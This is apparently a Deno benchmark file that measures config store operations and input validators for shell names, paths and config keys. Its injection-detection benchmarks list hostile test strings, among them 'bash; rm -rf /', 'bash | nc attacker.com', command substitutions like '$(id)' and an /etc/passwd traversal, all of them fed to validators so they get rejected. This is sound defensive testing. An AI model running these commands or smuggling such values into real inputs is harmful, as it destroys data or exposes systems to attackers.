// SPDX-License-Identifier: PMPL-1.0-or-later
// tests/bench/config_bench.ts - Performance benchmarks for configuration operations
//
// Benchmarks key operations: config read, validation, serialization.

// ============================================================================
// Simple Configuration Store for Benchmarking
// ============================================================================

class ConfigStore {
  private data: Map<string, string> = new Map();

  set(key: string, value: string): void {
    this.data.set(key, value);
  }

  get(key: string): string | undefined {
    return this.data.get(key);
  }

  has(key: string): boolean {
    return this.data.has(key);
  }

  getAll(): Map<string, string> {
    return new Map(this.data);
  }
}

// ============================================================================
// Validators for Benchmarking
// ============================================================================

function validateShellName(name: string): boolean {
  return /^[a-z0-9_]+$/.test(name) && name.length > 0;
}

function validateShellPath(path: string): boolean {
  if (path.includes("..") || path.startsWith("./")) return false;
  const injectionChars = [";", "|", "&", ">", "<", "`", "$"];
  return !injectionChars.some((char) => path.includes(char));
}

function validateConfigKey(key: string): boolean {
  if (key.length === 0) return false;
  return /^[a-zA-Z0-9_]+$/.test(key);
}

function validateConfigValue(value: string): boolean {
  return !value.includes("\0");
}

// ============================================================================
// Benchmarks
// ============================================================================

// --- Config Read Throughput ---

Deno.bench("Config read throughput (1K entries)", () => {
  const store = new ConfigStore();

  // Setup
  for (let i = 0; i < 1000; i++) {
    store.set(`KEY_${i}`, `value_${i}`);
  }

  // Benchmark: read all keys
  for (let i = 0; i < 1000; i++) {
    store.get(`KEY_${i}`);
  }
});

Deno.bench("Config read throughput (10K entries)", () => {
  const store = new ConfigStore();

  // Setup
  for (let i = 0; i < 10000; i++) {
    store.set(`KEY_${i}`, `value_${i}`);
  }

  // Benchmark: read random 100 keys
  for (let i = 0; i < 100; i++) {
    const idx = Math.floor(Math.random() * 10000);
    store.get(`KEY_${idx}`);
  }
});

Deno.bench("Config write throughput (1K entries)", () => {
  const store = new ConfigStore();

  // Benchmark: write 1000 keys
  for (let i = 0; i < 1000; i++) {
    store.set(`KEY_${i}`, `value_${i}`);
  }
});

// --- Shell Validation Speed ---

Deno.bench("Validate shell names (1K validations)", () => {
  const validNames = ["bash", "zsh", "fish", "dash", "ksh"];

  for (let i = 0; i < 1000; i++) {
    const name = validNames[i % validNames.length];
    validateShellName(name);
  }
});

Deno.bench("Validate shell names (10K validations)", () => {
  const validNames = ["bash", "zsh", "fish", "dash", "ksh"];

  for (let i = 0; i < 10000; i++) {
    const name = validNames[i % validNames.length];
    validateShellName(name);
  }
});

Deno.bench("Validate shell paths (1K validations)", () => {
  const validPaths = [
    "/bin/bash",
    "/usr/bin/zsh",
    "/usr/bin/fish",
    "/bin/dash",
    "/bin/ksh",
  ];

  for (let i = 0; i < 1000; i++) {
    const path = validPaths[i % validPaths.length];
    validateShellPath(path);
  }
});

Deno.bench("Detect shell path injections (1K attempts)", () => {
  const injections = [
    "bash; rm -rf /",
    "bash | nc attacker.com",
    "bash && evil",
    "bash`whoami`",
    "/bin/bash$(id)",
  ];

  for (let i = 0; i < 1000; i++) {
    const attack = injections[i % injections.length];
    validateShellPath(attack);
  }
});

// --- Config Key Validation Speed ---

Deno.bench("Validate config keys (1K validations)", () => {
  const validKeys = ["SHELL", "EDITOR", "PATH", "HOME", "USER"];

  for (let i = 0; i < 1000; i++) {
    const key = validKeys[i % validKeys.length];
    validateConfigKey(key);
  }
});

Deno.bench("Validate config values (1K validations)", () => {
  const validValues = [
    "/bin/bash",
    "/usr/bin/vim",
    "/usr/bin:/bin",
    "",
    "value:with:colons",
  ];

  for (let i = 0; i < 1000; i++) {
    const value = validValues[i % validValues.length];
    validateConfigValue(value);
  }
});

Deno.bench("Detect config key injections (1K attempts)", () => {
  const injections = [
    "SHELL=bash",
    "KEY;other=value",
    "KEY$(id)",
    "KEY`whoami`",
    "KEY|cat",
  ];

  for (let i = 0; i < 1000; i++) {
    const attack = injections[i % injections.length];
    validateConfigKey(attack);
  }
});

// --- Config Serialization ---

Deno.bench("Config serialization (100 entries)", () => {
  const store = new ConfigStore();

  // Setup
  for (let i = 0; i < 100; i++) {
    store.set(`KEY_${i}`, `value_${i}`);
  }

  // Benchmark: serialize to JSON
  JSON.stringify(Object.fromEntries(store.getAll()));
});

Deno.bench("Config serialization (1K entries)", () => {
  const store = new ConfigStore();

  // Setup
  for (let i = 0; i < 1000; i++) {
    store.set(`KEY_${i}`, `value_${i}`);
  }

  // Benchmark: serialize to JSON
  JSON.stringify(Object.fromEntries(store.getAll()));
});

// --- Mixed Operations ---

Deno.bench("Mixed read/write operations (100 iterations)", () => {
  const store = new ConfigStore();

  for (let i = 0; i < 100; i++) {
    // Write
    store.set(`KEY_${i}`, `value_${i}`);

    // Read
    store.get(`KEY_${i}`);

    // Validate
    validateShellName("bash");
    validateConfigKey(`KEY_${i}`);

    // Check existence
    store.has(`KEY_${i}`);
  }
});

Deno.bench("Mixed read/write operations (1K iterations)", () => {
  const store = new ConfigStore();

  for (let i = 0; i < 1000; i++) {
    // Write
    store.set(`KEY_${i % 100}`, `value_${i}`);

    // Read
    store.get(`KEY_${i % 100}`);

    // Validate
    validateShellName("bash");
    validateConfigKey(`KEY_${i % 100}`);

    // Check existence
    store.has(`KEY_${i % 100}`);
  }
});

// --- Worst Case Scenarios ---

Deno.bench("Validation on pathological input (1K attempts)", () => {
  const pathologicalInputs: string[] = [
    "a".repeat(10000),  // Very long string
    "...../../../../../../../etc/passwd",  // Deep traversal
    ";".repeat(1000),  // Repeated injection char
  ];

  for (let i = 0; i < 1000; i++) {
    const input = pathologicalInputs[i % pathologicalInputs.length];
    validateShellPath(input);
    validateConfigKey(input);
    validateConfigValue(input);
  }
});
